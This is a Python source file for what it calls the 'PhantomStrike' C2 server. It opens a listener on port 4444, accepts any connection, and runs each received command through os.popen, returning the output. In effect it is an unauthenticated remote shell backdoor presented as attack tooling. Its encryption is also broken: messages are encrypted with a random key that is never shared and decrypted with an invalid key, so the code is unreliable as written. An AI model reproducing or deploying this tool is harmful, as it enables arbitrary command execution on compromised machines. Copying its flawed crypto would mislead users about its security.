import socket
import threading
import time
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import base64
import os

# ASCII Art for PhantomStrike C2 Server
print("""
██████╗ ██╗  ██╗ █████╗ ███╗   ███╗ ████████╗ ███████╗
██╔══██╗██║  ██║██╔══██╗████╗ ████║ ╚══██╔══╝ ██╔════╝
██████╔╝███████║███████║██╔████╔██║    ██║    █████╗
██╔═══╝ ██╔══██║██╔══██║██║╚██╔╝██║    ██║    ██╔══╝
██║     ██║  ██║██║  ██║██║ ╚═╝ ██║    ██║    ███████╗
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝    ╚═╝    ╚══════╝
           PhantomStrike - C2 Server     
              
      MASTER = Akkaiaj
""")

# RSA Keys for encryption
private_key = RSA.generate(2048)
public_key = private_key.publickey()

# Encryption/Decryption methods
def encrypt_message(message):
    key = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(message.encode())
    encrypted_message = base64.b64encode(cipher.nonce + tag + ciphertext).decode()
    return encrypted_message

def decrypt_message(encrypted_message):
    data = base64.b64decode(encrypted_message)
    nonce, tag, ciphertext = data[:16], data[16:32], data[32:]
    cipher = AES.new(private_key.export_key(), AES.MODE_EAX, nonce=nonce)
    return cipher.decrypt_and_verify(ciphertext, tag).decode()

# Handle client connections
def handle_client(client_socket):
    print("[+] Client connected.")
    try:
        while True:
            # Receive encrypted command
            encrypted_command = client_socket.recv(1024).decode()
            if encrypted_command:
                command = decrypt_message(encrypted_command)
                print(f"[*] Received command: {command}")
                if command.lower() == "exit":
                    client_socket.send(encrypt_message("Goodbye").encode())
                    break
                else:
                    result = execute_command(command)
                    client_socket.send(encrypt_message(result).encode())
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        client_socket.close()

# Execute the commands on the agent
def execute_command(command):
    try:
        result = os.popen(command).read()
        if not result:
            result = "No output"
        return result
    except Exception as e:
        return f"[-] Error executing command: {e}"

# Start C2 server
def start_server():
    server_ip = "0.0.0.0"
    server_port = 4444
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((server_ip, server_port))
    server.listen(5)
    print(f"[+] Listening on {server_ip}:{server_port}...")
    
    while True:
        client_socket, addr = server.accept()
        print(f"[+] Connection established with {addr}")
        client_handler = threading.Thread(target=handle_client, args=(client_socket,))
        client_handler.start()

if __name__ == "__main__":
    start_server()
